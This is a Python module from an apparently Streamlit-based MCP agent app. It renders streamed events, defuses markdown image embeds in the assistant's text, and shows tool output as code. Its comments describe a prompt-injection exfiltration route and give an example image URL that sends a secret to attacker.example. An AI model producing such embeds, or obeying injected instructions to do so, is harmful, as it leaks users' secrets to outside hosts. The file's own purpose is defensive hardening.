"""Drawing one streamed event.

This is the one piece of presentation worth unit testing, so by this
repository's own rule it does not belong in ``app.py``. It is a routing
decision with two wrong answers, and both were reachable: sending text to the
tool pane, and sending untrusted tool output through live markdown. Neither is
observable from a test that drives the script, because the turn ends in
``st.rerun()`` and the page is rebuilt from the transcript by
``render_history`` — mutating either branch of this function left the whole
suite green.
"""

from __future__ import annotations

import re
from typing import Any

import streamlit as st

from mcp_agent.turns import TurnEvent

#: Markdown image syntax, both inline `![alt](url)` and reference `![alt][id]`.
#: Streamlit renders either as an `<img>`, which the viewer's browser fetches
#: without anyone clicking — so a model that has been talked into writing
#: `![](https://attacker.example/?k=SECRET)` has an egress channel that no
#: sandbox closes, because the request leaves the browser and not the
#: container. The reference form was missed on the first pass and shipped an
#: open route while the docstring below claimed it was shut. Links are left
#: alone: they need a click, and stripping them would cost the model its
#: ability to cite anything.
_IMAGE = re.compile(r"!\[([^\]]*)\](?:\([^)]*\)|\[[^\]]*\])")


def without_images(text: str) -> str:
    """Assistant text with image embeds defused, keeping their alt text.

    The shell sandbox has no network, which closes the *command's* route out.
    This closes the reply's. Both halves are needed for the claim that 0.5.0
    answers the injection path 0.2.0 removed the shipped shell over — a
    security review found the second half open while the module docstring
    asserted it was shut.
    """

    def defuse(match: re.Match[str]) -> str:
        alt = match.group(1)
        return f"[image: {alt}]" if alt else "[image]"

    return _IMAGE.sub(defuse, text)


def draw(event: TurnEvent, text_placeholder: Any, tool_placeholder: Any) -> None:
    """Draw one streamed event into its own placeholder.

    Called from the script thread only. The agent runs on the background loop
    and hands its output over as data — see :mod:`mcp_agent.turns` for why
    drawing from there raises on every write.
    """
    if event.kind == "text":
        text_placeholder.markdown(without_images(event.payload))
        return

    with tool_placeholder.expander("🔧 Tool Call Information", expanded=True):
        # st.code, not st.markdown: tool output is untrusted and a literal
        # fence inside it would otherwise escape into live markdown.
        st.code(event.payload, language="json")
